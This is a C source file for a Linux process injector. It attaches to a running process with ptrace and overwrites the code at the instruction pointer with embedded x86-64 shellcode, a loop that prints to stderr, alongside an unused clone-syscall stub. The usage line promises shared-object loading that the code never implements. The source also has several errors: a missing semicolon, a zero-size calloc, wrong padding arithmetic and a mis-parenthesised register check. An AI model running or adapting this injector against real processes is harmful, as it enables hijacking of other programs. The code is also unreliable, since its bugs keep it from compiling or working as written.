#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>

#ifdef __x86_64__
#	define WORD_BYTES 8
#else
#	define WORD_BYTES 4
#endif
#define WORD_CTYPE unsigned long // long always defaults to the size of processor's word

struct padded_shellcode {
	WORD_CTYPE *shellcode;
	int size;
};

unsigned char clone_64[] = {
  0x41, 0x54, 0x4c, 0x8b, 0x64, 0x24, 0x10, 0x50, 0x57, 0x56, 0x52, 0x41,
  0x52, 0x41, 0x51, 0xb8, 0x38, 0x00, 0x00, 0x00, 0xbf, 0x00, 0x20, 0x00,
  0x00, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0x4d, 0x31, 0xd2, 0x4d, 0x31,
  0xc9, 0x0f, 0x05, 0x48, 0x83, 0xf8, 0x00, 0x75, 0x03, 0x41, 0xff, 0xe4,
  0x41, 0x59, 0x41, 0x5a, 0x5a, 0x5e, 0x5f, 0x58, 0x41, 0x5c, 0xc3
};
unsigned int clone_64_len = 59

unsigned char pushaddr_64[] = {
  0x41, 0x54, 0x49, 0xbc, 0xef, 0xbe, 0xad, 0xde, 0xef, 0xbe, 0xad, 0xde,
  0x41, 0x54
};
unsigned int pushaddr_64_len = 14;

unsigned char popaddr_64[] = {
  0x41, 0x5c, 0x41, 0x5c
};
unsigned int popaddr_64_len = 4;


#ifdef __x86_64__
#	define clone clone_64
#	define clone_len clone_64_len
#	define pushaddr pushaddr_64
#	define pushaddr_len pushaddr_64_len
#	define popaddr popaddr_64
#	define popaddr_len popaddr_64_len
#else
#	error NOT IMPLEMENTED
#endif

unsigned char while_print[] = {
  0xeb, 0x12, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x02, 0x00, 0x00, 0x00,
  0x5e, 0xba, 0x06, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xe9, 0xff, 0xff,
  0xff, 0x63, 0x75, 0x6c, 0x6f, 0x21, 0x0a
};

unsigned int while_print_len = 31;

void pad_shellcode(unsigned char *shellcode, int len, struct padded_shellcode *dst) {
	int padded_len;
	if (len % WORD_BYTES == 0)  {
		dst->shellcode = (WORD_CTYPE *) shellcode;
		dst->size = len;
	} else {
		padded_len = len + len % WORD_BYTES;
		dst->shellcode = (WORD_CTYPE *) calloc(0, padded_len);
		memcpy(dst->shellcode, shellcode, len);
		dst->size = padded_len;
	}
}

int main(int argc, char **argv) {
	int i;
	pid_t pid;
	struct user_regs_struct reg_data;
	long long int pokeaddr;
	struct padded_shellcode padded;
	if (argc != 6) {
		printf("Usage: injector pid dlopen_address dlsym_address so entry\n");
		exit(1);
	}
	pid = atoi(argv[1]);
	if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
		printf("[-] Unable to attach to %d\n", pid);
		exit(1);
	}
	printf("[+] Successfully attached to %d\n", pid);
	waitpid(pid, NULL, 0);
	ptrace(PTRACE_GETREGS, pid, NULL, &reg_data);
	if (reg_data.rip & 0xffffffff == 0xffffffff) {
		printf("[-] RIP looks broken\n");
		ptrace(PTRACE_DETACH, pid, NULL, NULL);
		exit(1);
	}
	printf("[+] Got reg data\n[+] RIP is at %016llx\n[+] Injecting code...\n", reg_data.rip);
	pad_shellcode(while_print, while_print_len, &padded);
	for (i = 0, pokeaddr = reg_data.rip; i < padded.size / WORD_BYTES; i++, pokeaddr += WORD_BYTES) {
		ptrace(PTRACE_POKETEXT, pid, pokeaddr, padded.shellcode[i]);
	}
	printf("[+] Code injected, detaching...\n");
	ptrace(PTRACE_DETACH, pid, NULL, NULL);
}

